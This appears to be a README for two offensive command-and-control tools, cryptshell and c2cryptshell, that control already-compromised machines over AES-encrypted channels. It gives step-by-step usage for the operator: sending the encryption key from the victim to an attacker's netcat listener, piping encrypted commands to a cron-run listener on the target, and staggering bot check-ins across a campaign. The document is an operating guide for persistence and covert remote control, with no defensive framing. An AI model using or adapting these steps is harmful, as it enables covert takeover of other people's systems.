# cryptshell
Active AES Encrypted C2 Campaign Management

## usage
- pwn target
- configure the following variables in cryptshell
	- RHOST (the IP of your C2 server that you will be sending the commands from)
	- RPORT (the port on your C2 server that you want cryptshell to send the AES key to)
	- LPORT (the port you want the target to listen on)
- setup listener on attack box (to recieve key): nc -lnvp $RPORT > aes.key
- run cryptshell on target and kill the connection after the key is transferred
- pipe c2 commands through aescrypt and a socket to your target (the listener and decrypter are on a cron): echo "touch tmp" | aescrypt -e -k aes.key - | nc target $LPORT
	- since it runs on a cron, you can only send one payload per cron cycle, so I suggest you prepare scripted one liners
	- you will know if the commands were sent if you run the command and the connection hangs, wait a few seconds and force quit it

# c2cryptshell
Passive AES Encrypted C2 Campaign Management

## usage
- [the first four steps from cryptshell, replacing cryptshell with c2cryptshell]
- run c2cryptgen.sh on attack box
- kill the connection on the attack box after the connection is made
- [repeat steps 2 and 3, per set of instructions, until all bots have made the connection]

## red team notes
- stagger crons on bots so that they do not all try and connect at the same time, and keep note of which bots call back when so you can track who recieved what instructions
